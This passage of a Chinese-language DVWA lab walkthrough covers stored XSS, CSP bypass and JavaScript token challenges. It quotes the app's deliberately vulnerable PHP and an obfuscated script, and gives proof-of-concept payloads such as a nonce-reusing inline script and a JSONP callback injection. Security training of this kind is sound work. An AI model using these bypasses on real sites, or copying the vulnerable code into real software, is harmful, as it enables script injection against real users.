    // Sanitize name input  
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
  
    // Update database  
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );  
  
    //mysql_close();  
}  
  
?>  
```

`isset()`函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false  

`trim()`函数作用为移除字符串两侧空白字符或其他预定义字符  

`stripslashes()`函数用于删除字符串中的反斜杠  

```  
mysqli_real_escape_string()`函数会对字符串中的特殊符号`(\\x00，\\n，\\r，\\，'，"，\\x1a)  
```

进行转义。  

在代码中对message，name输入框内容没有进行XSS方面的过滤和检查。且通过`query`语句插入到数据库中。所以存在存储型XSS漏洞。  

![](/images/dvwa/21.png)  


![](/images/dvwa/22.png)  


medium, high和上面反射类型的绕过方式相同  

## CSP bypass  

CSP：浏览器的安全策略，如果标签，或者是服务器中返回 HTTP 头中有 `Content-Security-Policy` 标签 ，浏览器会根据标签里面的内容，判断哪些资源可以加载或执行  

### low  

```php  
<?php  
  
$headerCSP = "Content-Security-Policy: script-src 'self' <https://pastebin.com>  example.com code.jquery.com <https://ssl.google-analytics.com> ;"; // allows js from self, pastebin.com, jquery and google analytics.  
  
header($headerCSP);  
  
# <https://pastebin.com/raw/R570EE00>  
  
?>  
<?php  
if (isset ($_POST['include'])) {  
$page[ 'body' ] .= "  
    <script src='" . $_POST['include'] . "'></script>  
";  
}  
$page[ 'body' ] .= '  
<form name="csp" method="POST">  
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>  
    <input size="50" type="text" name="include" value="" id="include" />  
    <input type="submit" value="Include" />  
</form>  
';  
```

![](/images/dvwa/23.png)  


直接上pastebin网站写一个js的代码写进入即可  

### medium  

```php  
<?php  
  
$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";  
  
header($headerCSP);  
  
// Disable XSS protections so that inline alert boxes will work  
header ("X-XSS-Protection: 0");  
  
?>  
<?php  
if (isset ($_POST['include'])) {  
$page[ 'body' ] .= "  
    " . $_POST['include'] . "  
";  
}  
$page[ 'body' ] .= '  
<form name="csp" method="POST">  
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>  
    <input size="50" type="text" name="include" value="" id="include" />  
    <input type="submit" value="Include" />  
</form>  
';  
```

http头信息中的script-src的合法来源发生了变化，说明如下  

- `unsafe-inline`，允许使用内联资源，如内联< script>元素，javascript:URL，内联事件处理程序（如onclick）和内联< style>元素。必须包括单引号。  
- `nonce-source`，仅允许特定的内联脚本。nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA"  
  
```php  
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>  
```

### high  

```php  
<?php  
$headerCSP = "Content-Security-Policy: script-src 'self';";  
  
header($headerCSP);  
  
?>  
<?php  
if (isset ($_POST['include'])) {  
$page[ 'body' ] .= "  
    " . $_POST['include'] . "  
";  
}  
$page[ 'body' ] .= '  
<form name="csp" method="POST">  
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>  
    <p>1+2+3+4+5=<span id="answer"></span></p>  
    <input type="button" id="solve" value="Solve the sum" />  
</form>  
  
<script src="source/high.js"></script>  
';  
function clickButton() {  
    var s = document.createElement("script");  
    s.src = "source/jsonp.php?callback=solveSum";  
    document.body.appendChild(s);  
}  
  
function solveSum(obj) {  
    if ("answer" in obj) {  
        document.getElementById("answer").innerHTML = obj['answer'];  
    }  
}  
  
var solve_button = document.getElementById ("solve");  
  
if (solve_button) {  
    solve_button.addEventListener("click", function() {  
        clickButton();  
    });  
}  
```

CSP头中只有`script-src 'self'`说明只允许本节面加载的js执行。js逻辑：  

点击按钮 -> js 生成一个 script 标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到 DOM 中 -> js 中定义了一个 solveNum 的函数 -> 因此 script 标签会把远程加载的`solveSum({"answer":"15"})`当作js代码执行。  

但是服务端的代码中，可以接收include传入的参数。  

callback 参数可以被操控以生成任何你想要得到的结果, 比如 alert, 因此可以构造 Payload:  

```jsx  
<script src="source/jsonp.php?callback=alert('hacked');"></script>  
```

把这个当做 include 参数传给界面就注入成功  

## JavaScript  

### low  

```jsx  
<?php  
$page[ 'body' ] .= <<<EOF  
<script>  
  
/*  
MD5 code from here  
<https://github.com/blueimp/JavaScript-MD5>  
*/  
  
!function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);  
  
    function rot13(inp) {  
        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});  
    }  
  
    function generate_token() {  
        var phrase = document.getElementById("phrase").value;  
        document.getElementById("token").value = md5(rot13(phrase));  
    }  
  
    generate_token();  
</script>  
EOF;  
?>  
```

输入success带token:  

![](/images/dvwa/24.png)  


![](/images/dvwa/25.png)  


### medium  

```php  
<?php  
$page[ 'body' ] .= <<<EOF  
<script src="/vulnerabilities/javascript/source/medium.js"></script>  
EOF;  
?>  
function do_something(e){  
	for(var t="",n=e.length-1;n>=0;n--)  
			t+=e[n];  
	return t  
}  
setTimeout(function(){do_elsesomething("XX")},300);  
function do_elsesomething(e)  
{  
	document.getElementById("token").value=do_something(e+document.getElementById("phrase").value+"XX")  
}  
```

将phrase变量的值逆序，也就是sseccus;生成的token值`XXsseccusXX`  

### high  

```jsx  
var a=['fromCharCode','toString','replace','BeJ','\\x5cw+','Lyg','SuR','(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&&1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&&1c\\x202d===\\x271n\\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&&1c\\x202g===\\x271n\\x27&&2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&&2l.3P;q\\x201y=!Y.3H&&1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&&1x.1w&&1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i<1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i<1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&&s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&&G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W>1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i<1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n>=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);','||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|evaltest|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW','split'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};evaltest(function(d,e,f,g,h,i){h=function(j){return(j<e?'':h(parseInt(j/e)))+((j=j%e)>0x23?String[b('0x0')](j+0x1d):j[b('0x1')](0x24));};if(!''[b('0x2')](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if('wpA'!==b('0x3')){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b('0x4');};f=0x1;}}];h=function(){return b('0x4');};f=0x1;};while(f--){if(g[f]){if(b('0x5')===b('0x6')){return i[h];}else{d=d[b('0x2')](new RegExp('\\x5cb'+h(f)+'\\x5cb','g'),g[f]);}}}return d;}(b('0x7'),0x3e,0x137,b('0x8')[b('0x9')]('|'),0x0,{}));  
```

js被加密，解密：http://deobfuscatejavascript.com/#  

```jsx  
function do_something(e) {  
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];  
    return t  
  
}  
  
function token_part_3(t, y = "ZZ") {  
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)  
}  
  
function token_part_2(e = "YY") {  
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)  
}  
  
function token_part_1(a, b) {  
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)  
}  
document.getElementById("phrase").value = "";  
setTimeout(function() {  
    token_part_2("XX")  
}, 300);  
document.getElementById("send").addEventListener("click", token_part_3);  
token_part_1("ABCD", 44);  
```

大致原因是中间js`document.getElementById("phrase").value = "";`输入的内容被置空。可以借助chrome的调试器修改这个内容。具体操作方式见https://www.codenong.com/cs106723183/  

就是在如下两处下断点：  
![](/images/dvwa/26.png)  
在console中输入`document.getElementById("phrase").value = "success";`修改值。  

## 参考链接  
https://www.freebuf.com/articles/web/274058.html  
https://jckling.github.io/2020/04/23/Security/DVWA/2.%20Command%20Injection/  
https://segmentfault.com/a/1190000019484055  
https://www.jianshu.com/p/ec2ca79e74b2
